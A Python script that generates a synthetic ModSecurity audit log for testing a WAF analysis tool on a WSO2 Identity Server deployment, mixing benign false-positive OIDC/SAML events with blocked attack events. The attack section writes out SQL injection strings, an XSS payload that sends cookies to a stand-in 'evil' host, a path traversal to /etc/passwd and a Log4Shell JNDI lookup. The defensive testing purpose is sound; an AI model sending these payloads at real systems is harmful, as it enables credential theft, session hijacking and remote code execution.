"""
Generate a realistic ModSecurity JSON audit log for a WSO2 Identity Server
(IS 7.2) deployment sitting behind the OWASP CRS.

This exists so the engine, tests and dashboard have something to chew on
WITHOUT needing the full Docker stack up. The traffic shape is deliberately
faithful to what an IdP actually produces behind a WAF:

* **Legitimate OIDC/SAML flows that false-positive the CRS.** The classic ones:
    - `redirect_uri` (a full URL) trips protocol/URL rules (921xxx).
    - `SAMLRequest` (base64+deflate) and long `state`/`code` tokens trip
      various rules that dislike long opaque blobs.
    - a `sessionDataKey` UUID that a signature mis-reads.
  These are broad: hundreds of different real users, low anomaly, benign data.

* **A smaller amount of genuine attack traffic** from a few IPs: SQLi on the
  login/basic-auth params, XSS reflected via an error page, path traversal on
  a static asset, and a Log4Shell probe in a header — narrow, high-anomaly,
  classic payloads.

Run: ``python sample-data/generate_sample.py > sample-data/sample_audit.jsonl``
"""
from __future__ import annotations

import base64
import json
import random
import sys
import uuid
from datetime import datetime, timedelta

random.seed(1337)

_NOW = datetime(2026, 7, 28, 9, 0, 0)


def _ts(i: int) -> str:
    return (_NOW + timedelta(seconds=i * 3)).strftime("%a %b %d %H:%M:%S %Y")


def _client_pool(n: int, prefix: str = "10.0") -> list[str]:
    return [f"{prefix}.{random.randint(0,254)}.{random.randint(1,254)}" for _ in range(n)]


def event(client_ip, method, uri, code, messages, ua="Mozilla/5.0"):
    return {
        "transaction": {
            "client_ip": client_ip,
            "time_stamp": _ts(random.randint(0, 5000)),
            "request": {
                "method": method,
                "uri": uri,
                "headers": {"User-Agent": ua, "Host": "id.example.com"},
            },
            "response": {"http_code": code},
            "messages": messages,
        }
    }


def msg(rule_id, message, data, severity="3", tags=None, score=None):
    m = {
        "message": message + (f" (Total Score: {score})" if score else ""),
        "details": {
            "ruleId": str(rule_id),
            "data": data,
            "severity": severity,
            "tags": tags or [],
        },
    }
    return m


def build() -> list[dict]:
    events: list[dict] = []

    # --- FALSE POSITIVES: broad, benign IdP parameters ---------------------
    legit_users = _client_pool(120)  # 120 distinct legitimate clients

    # 1. redirect_uri trips 921151 (HTTP header/URL) on /oauth2/authorize
    for ip in legit_users:
        rurl = random.choice([
            "https://app.example.com/callback",
            "https://portal.example.com/oidc/cb",
            "https://spa.example.com/#/auth",
        ])
        state = base64.urlsafe_b64encode(uuid.uuid4().bytes).decode().rstrip("=")
        uri = (
            f"/oauth2/authorize?response_type=code&client_id=web_app"
            f"&redirect_uri={rurl}&scope=openid%20profile&state={state}"
        )
        events.append(event(ip, "GET", uri, 403, [
            msg("921151", "HTTP Header Injection Attack via payload",
                f"Matched Data: {rurl} found within ARGS:redirect_uri: {rurl}",
                tags=["OWASP_CRS", "protocol-attack"]),
            msg("949110", "Inbound Anomaly Score Exceeded",
                "", tags=["anomaly-evaluation"], score=5),
        ]))

    # 2. long `state`/`code` opaque tokens trip 942432 (restricted SQL chars)
    for ip in random.sample(legit_users, 60):
        code = base64.urlsafe_b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes).decode().rstrip("=")
        uri = f"/oauth2/token?grant_type=authorization_code&code={code}&client_id=web_app"
        events.append(event(ip, "POST", uri, 403, [
            msg("942432", "Restricted SQL Character Anomaly Detection",
                f"Matched Data: {code[:12]} found within ARGS:code: {code}",
                severity="4", tags=["attack-sqli"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
        ]))

    # 3. SAMLRequest base64 blob trips 942190 on /samlsso
    for ip in random.sample(legit_users, 45):
        saml = base64.b64encode(("<samlp:AuthnRequest ID='%s'/>" % uuid.uuid4()).encode()).decode()
        uri = f"/samlsso?SAMLRequest={saml}&RelayState=/portal"
        events.append(event(ip, "GET", uri, 403, [
            msg("942190", "Detects MSSQL code execution and information gathering",
                f"Matched Data: {saml[:10]} found within ARGS:SAMLRequest: {saml}",
                severity="2", tags=["attack-sqli"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
        ]))

    # 4. sessionDataKey UUID trips 920273 (invalid chars) on /commonauth
    for ip in random.sample(legit_users, 30):
        sdk = str(uuid.uuid4())
        uri = f"/commonauth?sessionDataKey={sdk}&type=oidc"
        events.append(event(ip, "GET", uri, 403, [
            msg("920273", "Invalid character in request (outside of very strict set)",
                f"Matched Data: - found within ARGS:sessionDataKey: {sdk}",
                severity="4", tags=["protocol-attack"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
        ]))

    # --- REAL ATTACKS: narrow, high-anomaly, classic payloads --------------
    attackers = ["45.9.148.3", "185.220.101.7", "91.219.236.19"]

    # SQLi on the login username (few IPs, many paths = scanning)
    for _ in range(14):
        ip = random.choice(attackers)
        payload = random.choice([
            "admin' OR 1=1--", "' UNION SELECT username,password FROM users--",
            "'; WAITFOR DELAY '0:0:5'--",
        ])
        uri = f"/authenticationendpoint/login.do?username={payload}&password=x"
        events.append(event(ip, "POST", uri, 403, [
            msg("942100", "SQL Injection Attack Detected via libinjection",
                f"Matched Data: {payload} found within ARGS:username: {payload}",
                severity="2", tags=["attack-sqli"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=15),
        ], ua="sqlmap/1.7"))

    # XSS reflected via error page param
    for _ in range(9):
        ip = random.choice(attackers)
        payload = "<script>document.location='//evil/'+document.cookie</script>"
        uri = f"/authenticationendpoint/error.jsp?message={payload}"
        events.append(event(ip, "GET", uri, 403, [
            msg("941100", "XSS Attack Detected via libinjection",
                f"Matched Data: {payload[:20]} found within ARGS:message: {payload}",
                severity="2", tags=["attack-xss"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=15),
        ], ua="Mozilla/5.0 (scanner)"))

    # Path traversal on a static asset
    for _ in range(7):
        ip = random.choice(attackers)
        payload = "../../../../etc/passwd"
        uri = f"/authenticationendpoint/css/../../{payload}"
        events.append(event(ip, "GET", uri, 403, [
            msg("930110", "Path Traversal Attack (/../)",
                f"Matched Data: ../ found within REQUEST_URI: {uri}",
                severity="2", tags=["attack-lfi"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=10),
        ], ua="curl/8.0"))

    # Log4Shell probe in a header on /scim2/Users
    for _ in range(5):
        ip = random.choice(attackers)
        payload = "${jndi:ldap://evil.example/a}"
        uri = "/scim2/Users"
        events.append(event(ip, "GET", uri, 403, [
            msg("944100", "Remote Command Execution: Suspicious Java class detected",
                f"Matched Data: {payload} found within REQUEST_HEADERS:User-Agent: {payload}",
                severity="2", tags=["language-java", "attack-rce"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=15),
        ], ua=payload))

    # --- AMBIGUOUS: a param that's borderline (few clients, no signature) ---
    for ip in _client_pool(3, prefix="172.16"):
        uri = "/scim2/Users?filter=userName%20eq%20%22a'b%22"
        events.append(event(ip, "GET", uri, 403, [
            msg("942100", "SQL Injection Attack Detected via libinjection",
                "Matched Data: 'b found within ARGS:filter: userName eq \"a'b\"",
                severity="2", tags=["attack-sqli"]),
            msg("949110", "Inbound Anomaly Score Exceeded", "", score=5),
        ]))

    random.shuffle(events)
    return events


if __name__ == "__main__":
    out = sys.stdout
    for ev in build():
        out.write(json.dumps(ev) + "\n")
